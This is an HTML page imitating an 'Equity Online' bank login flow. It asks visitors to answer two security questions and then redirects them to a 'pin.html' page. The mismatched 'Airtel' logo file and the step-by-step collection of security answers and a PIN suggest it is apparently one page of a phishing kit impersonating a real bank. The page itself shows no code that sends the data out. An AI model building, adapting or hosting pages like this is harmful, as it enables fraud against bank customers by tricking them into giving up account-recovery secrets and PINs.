<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <title>Equity Online</title>
    <style>
        body {
            margin: 0;
            font-family: 'Roboto', sans-serif;
            display: flex;
            height: 100vh;
            background-color: #f7f7f7;
        }
        
        .left-section {
            flex: 2;
            background: #C8102E;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: flex-start;
            padding: 40px;
            color: white;
        }
        
        .right-section {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-form {
            width: 100%;
            max-width: 400px;
            background: white;
            border-radius: 5px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            padding: 20px;
        }
        
        .login-form h2 {
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }
        
        input[type="text"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-bottom: 10px;
        }
        
        button {
            width: 100%;
            padding: 10px;
            background-color: #C8102E;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 500;
        }
        
        button:hover {
            background-color: #A50F20;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
        }
        
        .footer a {
            color: #C8102E;
            text-decoration: none;
        }
        
        .logo {
            max-width: 150px;
            margin-bottom: 20px;
        }
    </style>
</head>

<body>

    <div class="left-section">
        <img src="Airtel-Emblema.png" alt="Equity Logo" class="logo">
        <h1>Equity</h1>
        <h2>Welcome to Equity online</h2>
        <p>More than just banking.</p>
    </div>

    <div class="right-section">
        <div class="login-form">
            <h2>Verify</h2>
            <p>Answer your security questions to continue.</p>

            <div class="form-group">
                <label for="answer1" id="question1-label"></label>
                <input type="text" id="answer1" placeholder="Enter your answer" required>
            </div>

            <div class="form-group">
                <label for="answer2" id="question2-label"></label>
                <input type="text" id="answer2" placeholder="Enter your answer" required>
            </div>

            <button id="confirm-button">Confirm</button>
            <p class="footer">English</p>
        </div>
    </div>

    <script>
        // Fetching questions from Local Storage
        document.getElementById('question1-label').innerText = localStorage.getItem('question1') || 'Question 1';
        document.getElementById('question2-label').innerText = localStorage.getItem('question2') || 'Question 2';

        // Fetching saved answers from Local Storage
        document.getElementById('answer1').value = localStorage.getItem('answer1') || '';
        document.getElementById('answer2').value = localStorage.getItem('answer2') || '';

        document.getElementById('confirm-button').addEventListener('click', function() {
            const answer1 = document.getElementById('answer1').value.trim();
            const answer2 = document.getElementById('answer2').value.trim();

            // Validation before proceeding
            if (answer1 && answer2) {
                window.location.href = "pin.html"; // Redirect to pin.html
            } else {
                alert('Please answer all security questions.');
            }
        });
    </script>
</body>

</html>
